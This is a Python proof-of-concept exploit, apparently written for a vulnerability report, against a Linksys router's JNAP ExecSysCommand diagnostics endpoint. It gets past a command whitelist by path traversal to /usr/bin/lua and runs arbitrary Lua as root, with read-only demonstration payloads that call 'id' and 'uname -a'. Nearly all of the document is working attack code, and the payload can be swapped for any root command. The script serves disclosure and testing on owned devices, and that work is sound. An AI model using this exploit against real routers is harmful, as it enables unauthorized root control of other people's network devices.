#!/usr/bin/env python3
"""PoC for report-6: ExecSysCommand whitelist bypass -> root Lua execution.

cmd is validated on the RAW string (contains whitelisted substring) but the
NORMALIZED path executes: /lib/libnl/cli/cls/../../../../usr/bin/lua -> /usr/bin/lua.
param becomes the Lua -e argument; output returns in-band (output.cmdresult).
Read-only payloads only.

usage:
  set LN11_HOST=192.168.x.x
  set LN11_ADMIN_PASSWORD=<password>
  py -3 poc.py

For owned devices only. Self-contained: stdlib only.
"""
import base64
import http.client
import json
import os
import ssl

ACTION = "http://linksys.com/jnap/diagnostics/ExecSysCommand"
TRAV = "/lib/libnl/cli/cls/../../../../usr/bin/lua"


def lua_exec(code, timeout=12.0):
    host = os.environ.get("LN11_HOST", "192.168.1.1")
    pw = os.environ["LN11_ADMIN_PASSWORD"]
    auth = base64.b64encode(f"admin:{pw}".encode()).decode()
    body = json.dumps({"cmd": TRAV, "param": "-e " + code},
                      separators=(",", ":")).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    c = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    try:
        c.request("POST", "/JNAP/", body=body, headers={
            "X-JNAP-Action": ACTION,
            "X-JNAP-Authorization": f"Basic {auth}",
            "Content-Type": "application/json; charset=UTF-8"})
        r = c.getresponse()
        raw = r.read(1024 * 1024).decode("utf-8", "replace")
    finally:
        c.close()
    try:
        return json.loads(raw)["output"]["cmdresult"]
    except Exception:
        return "RAW:" + raw[:200]


def main():
    print("[1] lua sanity :", repr(lua_exec("print(123*456)")))
    print("[2] root id    :", repr(lua_exec(r'local f=io.popen("id") print(f:read("*a"))')))
    print("[3] uname -a   :", repr(lua_exec(r'local f=io.popen("uname -a") print(f:read("*a"))')))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
